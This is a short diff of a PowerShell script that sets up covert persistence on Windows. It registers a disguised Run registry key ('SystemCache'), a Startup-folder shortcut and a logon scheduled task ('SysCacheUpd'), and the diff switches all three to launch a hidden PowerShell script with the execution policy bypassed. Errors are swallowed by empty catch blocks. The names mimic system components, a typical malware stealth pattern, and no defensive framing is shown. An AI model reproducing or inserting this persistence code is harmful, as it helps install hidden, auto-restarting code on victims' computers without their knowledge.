@@ -50,14 +50,15 @@ if(Test-Admin){
     }catch{}
 }
 try{
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemCache" -Value "$dest\TaskService.vbs"
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemCache" -Value "$dest\system_cache.ps1"
     $sh=New-Object -ComObject WScript.Shell
     $lnk="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\cache.lnk"
     $sc=$sh.CreateShortcut($lnk)
-    $sc.TargetPath="$dest\TaskService.vbs"
+    $sc.TargetPath="powershell.exe"
+    $sc.Arguments="-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dest\system_cache.ps1`""
     $sc.WorkingDirectory=$dest
     $sc.Save()
-    $action=New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$dest\TaskService.vbs`""
+    $action=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dest\system_cache.ps1`""
     $trigger=New-ScheduledTaskTrigger -AtLogOn
     Register-ScheduledTask -TaskName "SysCacheUpd" -Action $action -Trigger $trigger -Force
 }catch{}
